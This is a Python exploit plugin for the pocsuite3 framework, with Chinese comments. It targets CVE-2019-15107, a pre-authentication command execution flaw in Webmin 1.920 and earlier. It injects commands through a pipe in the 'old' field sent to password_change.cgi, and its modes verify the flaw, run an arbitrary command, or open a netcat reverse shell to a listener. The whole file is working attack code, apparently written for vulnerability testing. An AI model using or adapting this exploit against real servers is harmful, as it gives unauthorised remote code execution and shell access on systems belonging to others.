#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# 建议统一从 pocsuite3.api 导入
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)

# 限定框架版本，避免在老的框架上运行新的 PoC 插件
minimum_version_required('1.9.6')


# DemoPOC 类，继承自基类 POCBase
class DemoPOC(POCBase):# PoC 和漏洞的属性信息
    vulID = '98060'
    version = '1'
    author = 'Seebug'
    vulDate = '2019-08-19'
    createDate = '2022-07-11'
    updateDate = '2022-07-11'
    references = ['https://www.seebug.org/vuldb/ssvid-98060']
    name = 'Webmin <=1.920 Pre-Auth Command Execution (CVE-2019-15107)'
    appPowerLink = 'https://www.webmin.com'
    appName = 'Webmin'
    appVersion = '<=1.920'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    samples = ['']  # 测试样列，就是用 PoC 测试成功的目标
    install_requires = ['']  # PoC 第三方模块依赖
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''


    def _options(self):
        o = OrderedDict()
        o['cmd'] = OptString('whoami', description='The command to execute')
        return o

# 漏洞的核心方法
    def _exploit(self, param=''):
        if not self._check(dork='<title>Login to Webmin</title>'):
            return False

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url}/session_login.cgi'
        }
        payload = f'user=rootxx&pam=&expired=2&old=test|{param}&new1=test2&new2=test2'
        res = requests.post(f'{self.url}/password_change.cgi', headers=headers, data=payload)
        logger.debug(res.text)
        return res.text.split('The current password is incorrect')[-1].split('</h3></center>')[0]

    # verify 模式的实现
    def _verify(self):
        result = {}
        flag = random_str(6)
        param = f'echo {flag}'
        res = self._exploit(param)
        if res and flag in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo'][param] = res

        # 统一调用 self.parse_output() 返回结果
        return self.parse_output(result)

# attack 模式的实现
    def _attack(self):
        result = {}
        # self.get_option() 方法可以获取自定义的命令行参数
        param = self.get_option('cmd')
        res = self._exploit(param)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
        result['VerifyInfo'][param] = res
        # 统一调用 self.parse_output() 返回结果
        return self.parse_output(result)

# shell 模式的实现
    def _shell(self):
        try:
            self._exploit(REVERSE_PAYLOAD.NC.format(get_listener_ip(), get_listener_port()))
        except Exception:
            pass


# 将该 PoC 注册到框架。
register_poc(DemoPOC)